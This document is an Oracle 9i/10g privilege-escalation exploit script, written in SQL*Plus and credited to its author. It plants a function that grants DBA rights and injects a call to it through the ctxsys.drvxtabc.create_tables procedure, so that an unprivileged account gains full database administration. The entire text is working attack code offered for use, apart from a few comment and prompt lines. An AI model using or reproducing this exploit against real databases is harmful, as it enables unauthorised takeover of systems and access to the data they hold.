-- 
-- ctxsys.drvxtabc.create_tables
--
--
-- Oracle ctxsys.drvxtabc.create_tables exploit (9i/10g)
--
-- Grant dba permission to unprivileged user
-- 
-- 
--   REF:    http://www.google.it/search?q=ctxsys.drvxtabc.create_tables
--   
--   AUTHOR: Andrea "bunker" Purificato
--           http://rawlab.mindcreations.com
--
--
set serveroutput on;
prompt [+] ctxsys-drvxtabc-create_tables.sql exploit
prompt [+] by Andrea "bunker" Purificato - http://rawlab.mindcreations.com
prompt [+] 37F1 A7A1 BB94 89DB A920  3105 9F74 7349 AF4C BFA2
prompt 
undefine the_user;
accept the_user char prompt 'Target username (default TEST): ' default 'TEST';
prompt
prompt [-] Building evil function...

CREATE OR REPLACE FUNCTION OWN RETURN NUMBER 
 AUTHID CURRENT_USER AS 
 PRAGMA AUTONOMOUS_TRANSACTION; 
BEGIN
 EXECUTE IMMEDIATE 'GRANT DBA TO &the_user'; COMMIT; 
 RETURN(0);
END;
/

prompt [-] Finishing...

exec ctxsys.drvxtabc.create_tables(''||user||'"."x" as select * from dual where '||USER||'.own=0--','x',2);

prompt [-] YOU GOT THE POWAH!!